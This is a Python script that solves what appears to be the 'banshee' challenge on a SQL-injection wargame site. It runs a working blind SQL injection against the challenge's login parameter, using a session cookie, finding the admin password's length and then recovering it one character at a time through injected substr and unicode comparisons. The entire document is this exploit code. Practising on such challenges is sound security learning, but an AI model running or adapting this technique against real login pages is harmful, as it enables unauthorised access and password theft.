import requests
import string

url = "https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php?"
cookie = {'PHPSESSID':'l76vhg3a57sh6gnch2itdmvsoj'}

def pw_length():
    pw_len = 0
    while True:
        pw_len += 1
        query = "pw=' or id='admin' and length(pw)={}-- ".format(pw_len)
        print(query)
        res = requests.get(url=url+query,cookies=cookie)
        if "login success!" in res.text:
            print("PASSWORD LENGTH : " + str(pw_len))
            break
    return pw_len


def pw_char(pw_len):
    passwd = ""
    for i in range(1, pw_len+1):
        for j in string.printable:
            query = "pw=' or id='admin' and unicode(substr(pw,{},1))={}-- ".format(i,ord(j))
            print(query)
            res = requests.get(url=url+query,cookies=cookie)
            if "login success!" in res.text:
                print("PASSWORD CHAR : " + j)
                passwd += j
                break
    print("PASSWORD : " + passwd)

if __name__ == "__main__":
    pw_len = pw_length()
    pw_char(pw_len)
